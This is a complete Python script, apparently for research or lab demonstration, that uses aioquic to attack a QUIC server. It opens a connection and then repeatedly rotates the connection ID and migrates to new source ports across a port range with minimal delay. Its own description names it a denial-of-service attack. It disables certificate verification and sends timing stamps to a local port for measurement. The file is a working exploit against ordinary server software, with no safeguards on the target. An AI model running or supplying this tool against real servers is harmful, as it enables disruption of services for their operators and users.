import argparse
import asyncio
import logging
import ssl
import socket
from typing import cast
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.logger import QuicFileLogger
from aioquic.quic.connection import QuicConnectionState

logger = logging.getLogger("client")

class DosClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.stream_id = None

    async def send(self, d) -> None:
        data = str(d).encode()
        if self.stream_id is None:
            self.stream_id = self._quic.get_next_available_stream_id()
        self._quic.send_stream_data(self.stream_id, data, end_stream=False)
        self.transmit()

def save_session_ticket(ticket):
    logger.info("New session ticket received")

async def change_transport(protocol, new_addr, new_port):
    loop = asyncio.get_event_loop()
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    completed = False
    try:
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        sock.bind((new_addr, new_port, 0, 0))
        completed = True
    finally:
        if not completed:
            sock.close()
    old_socket = protocol._transport
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: protocol,
        sock=sock,
    )
    old_socket.close()

def is_closed(client):
    return client._quic._state in [
        QuicConnectionState.CLOSING,
        QuicConnectionState.DRAINING,
        QuicConnectionState.TERMINATED
    ]

async def main(host, port, client_ip, start_port, end_port, sleep_time):
    logger.info(f"Connecting to {host}:{port} from {client_ip}")
    logger.info(f"Port range: {start_port} - {end_port}, sleep={sleep_time}s")
    try:
        configuration = QuicConfiguration(
            alpn_protocols=["dos-demo"], is_client=True)
        configuration.verify_mode = ssl.CERT_NONE
        configuration.quic_logger = QuicFileLogger("/tmp/qlog")

        async with connect(
            host, port,
            configuration=configuration,
            session_ticket_handler=save_session_ticket,
            create_protocol=DosClientProtocol,
            local_port=start_port,
        ) as client:
            client = cast(DosClientProtocol, client)
            await client.send("START")
            await asyncio.sleep(0.1)

            migrations = 0
            for p in range(start_port + 1, end_port):
                if is_closed(client):
                    break

                # DCID rotation — change connection ID first
                import time as _t1
                _T1 = _t1.time()
                import socket as _s1
                try:
                    _ts_sock = _s1.socket(_s1.AF_INET, _s1.SOCK_DGRAM)
                    _ts_sock.sendto(f"T1 {_T1:.6f}".encode(), ("127.0.0.1", 19999))
                    _ts_sock.close()
                except:
                    pass
                client.change_connection_id()

                # Then change transport (new src_port)
                host_str = "::ffff:" + client_ip
                await change_transport(client, host_str, p)
                client.transmit()
                migrations += 1

                await asyncio.sleep(sleep_time)

            await client.send("END")
            logger.info(
                f"Complete: {migrations} migrations from {client_ip}")
            await asyncio.sleep(0.5)

    except Exception as e:
        logger.error(f"Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="QUIC DoS with DCID rotation + transport migration")
    parser.add_argument("--host", type=str, required=True)
    parser.add_argument("--port", type=int, default=4444)
    parser.add_argument("--client-ip", type=str, required=True)
    parser.add_argument("--start-port", type=int, default=10000)
    parser.add_argument("--end-port", type=int, default=11000)
    parser.add_argument("--sleep", type=float, default=0.01,
                        help="Sleep between migrations (0.01=10ms, 0=fastest)")
    args = parser.parse_args()

    logging.basicConfig(
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
        level=logging.INFO,
    )

    asyncio.run(main(
        host=args.host,
        port=args.port,
        client_ip=args.client_ip,
        start_port=args.start_port,
        end_port=args.end_port,
        sleep_time=args.sleep,
    ))
